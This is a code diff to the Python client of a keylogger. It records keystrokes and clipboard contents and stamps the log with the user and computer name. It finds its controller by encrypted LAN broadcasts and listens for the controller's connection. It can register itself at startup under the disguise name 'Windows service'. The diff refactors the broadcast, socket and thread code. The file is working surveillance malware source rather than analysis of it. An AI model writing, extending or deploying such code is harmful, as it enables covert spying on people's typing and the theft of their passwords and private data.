@@ -1,11 +1,11 @@
 import socket
 from time import sleep
 import utils
-import constants
+from shared import BD_PORT, HOST_PORT
 import sys
 from getpass import getuser
-from os.path import realpath
-from os import environ
+from os import path
+import os
 import pyperclip
 from datetime import datetime
 from threading import Thread
@@ -14,20 +14,21 @@ from Cryptodome.PublicKey import RSA
 from Cryptodome.Cipher import PKCS1_OAEP
 import keyboard
 from string import printable
-
+import netifaces
 
 def broadcast_myself():
     """
     Repeatedly broadcasts the client so the controller will find it. All encrypted.
     """
-    global BD_PORT, BD_INTERVAL, conn, cipher_rsa
+    global conn, cipher_rsa
     BDs = socket.socket(type=socket.SOCK_DGRAM)
     while True:
         if not connected:
             BDs.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
             localIP = socket.gethostbyname(socket.gethostname())
-            BDs.sendto(cipher_rsa.encrypt(localIP.encode()),
-                       ("<broadcast>", BD_PORT))
+            for bd in utils.broadcast_addresses():
+                BDs.sendto(cipher_rsa.encrypt(b"hello"),
+                        (bd, BD_PORT))
         sleep(BD_INTERVAL)
     BDs.close()
 
@@ -39,7 +40,8 @@ def listen():
     global CERT_FILE, connected, log
     listener = socket.socket()
     utils.set_keepalive(listener)
-    listener.bind(("", constants.HOST_PORT))
+    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    listener.bind(("", HOST_PORT))
     listener.listen(1)
     while True:
         conn, _ = listener.accept()
@@ -111,8 +113,8 @@ def on_key_down(event):
     if (un_char or event.name in printable[:-5]) and not modifiers["ctrl"]:
         log += un_char if un_char else event.name
     elif not utils.is_modifier(unsided_name) and unsided_name not in BANNED_BUTTONS:
-        log += "{%s}" % ("".join(
-            [mod + "+" for mod in modifiers.keys() if modifiers[mod]]) + unsided_name).upper()
+        log += "{{{}}}".format("".join([mod + "+" for mod in modifiers.keys()
+                                        if modifiers[mod]]) + unsided_name).upper()
 
 
 if __name__ == "__main__":
@@ -120,27 +122,22 @@ if __name__ == "__main__":
     CLIP_POLL_RATE = 5
     STARTUP = False
     STARTUP_NAME = "Windows service"
-
-    if getattr(sys, 'frozen', False):
-        CERT_FILE = sys._MEIPASS + "/cert.pem"
-    else:
-        CERT_FILE = "cert.pem"
-
+    CERT_FILE = utils.resource_path("cert.pem")
     BANNED_BUTTONS = ["menu", "caps lock"]
 
     connected = False
     last_win = ""
-    log = header("KEYLOG STARTED AT {time} BY USER {user} ON {computer}".format(
-        time=datetime.now().strftime("%d.%m.%Y %H:%M:%S"), user=getuser(), computer=environ['COMPUTERNAME']))
-
-    if STARTUP:
-        utils.register_startup(STARTUP_NAME, realpath(sys.argv[0]))
-
+    log = header("KEYLOG STARTED AT {:%Y-%m-%d %H:%M} BY USER {} ON {}".format(
+        datetime.now(), getuser(), os.environ['COMPUTERNAME']))
     public_key = RSA.import_key(open(CERT_FILE).read())
     cipher_rsa = PKCS1_OAEP.new(public_key)
 
-    Thread(target=broadcast_myself).start()
-    Thread(target=listen).start()
-    Thread(target=clipboard_listener).start()
+    if STARTUP:
+        utils.register_startup(STARTUP_NAME, path.realpath(__file__))
+
+    Thread(target=broadcast_myself, daemon=True).start()
+    Thread(target=listen, daemon=True).start()
+    Thread(target=clipboard_listener, daemon=True).start()
+
     keyboard.on_press(on_key_down)
     keyboard.wait()
